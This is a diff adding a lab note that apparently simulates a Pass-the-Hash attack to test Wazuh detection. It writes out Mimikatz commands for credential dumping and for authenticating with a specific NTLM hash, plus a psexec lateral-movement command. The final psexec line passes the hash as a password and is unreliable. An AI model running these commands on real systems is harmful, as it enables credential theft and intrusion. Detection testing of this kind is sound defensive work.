@@ -1,0 +1,23 @@
+Pass-the-Hash (PtH) Attack Simulation
+Goal: Simulate a Pass-the-Hash attack to verify Wazuh’s detection of suspicious authentication using stolen NTLM hashes.
+Steps and Commands Executed:
+1.	Enable debug privileges in Mimikatz:
+privilege::debug
+
+-	 Grants Mimikatz necessary privileges to access sensitive credential data in memory.
+Output confirms Privilege '20' OK.
+2.	Start logging actions to a file for auditing purposes:
+log passthehash.log
+
+-	Keeps a record of commands executed, which is useful for later validation and troubleshooting.
+3.	Dump credentials from memory (optional reference):
+sekurlsa::logonpasswords
+
+-	Retrieves logon session credentials, including plaintext passwords, hashes, and Kerberos tickets. Helps simulate realistic attacker techniques.
+4.	Use NTLM hash to authenticate as Administrator (Pass-the-Hash) and spawn cmd.exe:
+sekurlsa::pth /user:Administrator /domain:WINSERV /ntlm:580b16d486d8d2cafa00b314d41fa396 /run:cmd.exe
+-	Simulates lateral movement by using the stolen NTLM hash instead of the password.
+-	This demonstrates how attackers can gain access without cracking passwords.
+-	Wazuh can detect unusual logon patterns and generate alerts if configured properly.
+.\psexec.exe \\192.168.182.10 -u WINSERV\Administrator -p 580b16d486d8d2cafa00b314d41fa396 cmd.exe
+triggered NTLM and Pass the HASH alerts
